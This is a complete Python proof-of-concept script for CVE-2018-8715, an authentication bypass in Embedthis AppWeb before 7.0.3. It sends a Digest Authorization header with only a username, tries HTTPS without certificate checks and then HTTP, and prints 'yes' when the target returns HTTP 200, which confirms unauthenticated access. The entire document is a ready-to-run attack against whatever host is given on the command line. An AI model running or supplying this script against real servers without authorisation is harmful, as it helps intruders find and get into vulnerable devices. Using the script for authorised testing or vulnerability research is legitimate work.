#!/usr/bin/env python3
#@author: badger
#date: 2019-10-29
#
import requests
import sys

class PoC(object):
    name = "AppWeb Authentication Bypass"
    appName = "AppWeb"
    appManu = "Embedthis Software LLC"
    appVersion = "< 7.0.3"
    updateDate = "2019-10-29"
    Platform = ""
    vulRefer = "CVE-2018-8715"

    def __init__(self, host, port, account):
        self.account = str(account)
        self.veri_url = str(host) + ':' + str(port)

    def _getcode(self):
        session = requests.Session()
        headers = {"Authorization": "Digest username={}".format(self.account)}
        try:
            res = session.get(url="https://"+self.veri_url, headers=headers, verify=False)
            return res.status_code
        except Exception as e:
            try:
                res = session.get(url="http://"+self.veri_url, headers=headers)
                return res.status_code
            except Exception as e:
                return 401

    def _check(self):
        code = self._getcode()
        if 200 == code:
            print("yes")
        else:
            print("no")

if __name__ == '__main__':
    try:
        host = sys.argv[1]
        port = sys.argv[2]
        account = sys.argv[3]
    except:
        print("Usage: python CVE-2018-8715.py <host> <port> <account>")
        exit(-1)
    poc = PoC(host, port, account)
    poc._check()
